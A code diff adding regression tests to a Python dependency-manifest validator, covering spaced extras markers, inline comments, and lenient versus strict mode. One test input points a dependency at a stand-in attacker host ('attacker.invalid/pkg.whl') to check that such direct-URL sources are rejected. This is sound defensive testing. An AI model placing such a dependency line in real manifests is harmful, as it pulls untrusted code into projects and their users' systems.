@@ -760,3 +760,71 @@ def test_tomllib_import_falls_back_to_tomli_on_python_3_10(monkeypatch):
         assert validator_module.tomllib.__name__ == "tomllib"
 
 
+def test_requirements_txt_lenient_mode_rejects_spaced_extras_replacement():
+    """Regression for the round-8 Codex P1 finding: PEP 508 permits
+    whitespace before the extras marker ("pydantic [email]>=2.6"). Without
+    accounting for that whitespace, this replacement's identity was
+    indistinguishable from the plain "pydantic>=2.5.0" it replaced, so the
+    lenient-mode same-identity exemption incorrectly let the extras-adding
+    change through without allowlist review."""
+    base = "pydantic>=2.5.0\n"
+    head = "pydantic [email]>=2.6.0\n"
+    result = validate_requirements_txt_diff(base, head, ALLOWED, strict_additive_only=False)
+    assert not result.is_valid
+    assert any("not an approved addition" in v for v in result.violations)
+
+
+def test_pyproject_lenient_mode_rejects_spaced_extras_replacement():
+    base = BASE_PYPROJECT
+    head = BASE_PYPROJECT.replace(
+        'dependencies = ["pyyaml>=6.0.1"]',
+        'dependencies = ["pyyaml>=6.0.1", "pydantic>=2.5.0"]',
+    )
+    head_with_extras = head.replace(
+        '"pydantic>=2.5.0"', '"pydantic [email]>=2.6.0"'
+    )
+    # Establish "pydantic>=2.5.0" as an existing base entry first, then
+    # replace it with the spaced-extras form.
+    base_with_pydantic = head
+    result = validate_pyproject_toml_diff(
+        base_with_pydantic, head_with_extras, ALLOWED, strict_additive_only=False
+    )
+    assert not result.is_valid
+    assert any(
+        "project.dependencies added entry" in v and "not an approved addition" in v
+        for v in result.violations
+    )
+
+
+def test_requirements_txt_inline_comment_on_approved_addition_passes():
+    """Regression for the round-8 Codex P2 finding: pip discards an inline
+    comment (e.g. "pdfplumber>=0.10  # docs https://example.com") and
+    installs the plain requirement, but a URL inside that comment was
+    previously misread by the direct-reference/VCS scan as an unapproved
+    source, rejecting an ordinary, already-approved addition."""
+    base = "pyyaml>=6.0.1\n"
+    head = "pyyaml>=6.0.1\npdfplumber>=0.10  # docs https://example.com\n"
+    result = validate_requirements_txt_diff(base, head, ALLOWED, strict_additive_only=False)
+    assert result.is_valid, result.violations
+
+
+def test_requirements_txt_inline_comment_does_not_mask_a_real_url_addition():
+    """The inline-comment strip must not become a bypass: an added line
+    that is genuinely a direct URL reference (not merely commented) is
+    still rejected."""
+    base = "pyyaml>=6.0.1\n"
+    head = "pyyaml>=6.0.1\npdfplumber @ https://attacker.invalid/pkg.whl  # totally fine\n"
+    result = validate_requirements_txt_diff(base, head, ALLOWED, strict_additive_only=False)
+    assert not result.is_valid
+    assert any("direct URL/source reference" in v for v in result.violations)
+
+
+def test_requirements_txt_inline_comment_change_only_does_not_fail_strict_mode():
+    """A line whose install-time content is unchanged but whose trailing
+    comment text changed is not a manifest modification."""
+    base = "pyyaml>=6.0.1  # old note\n"
+    head = "pyyaml>=6.0.1  # updated note\n"
+    result = validate_requirements_txt_diff(base, head, ALLOWED)
+    assert result.is_valid, result.violations
+
+
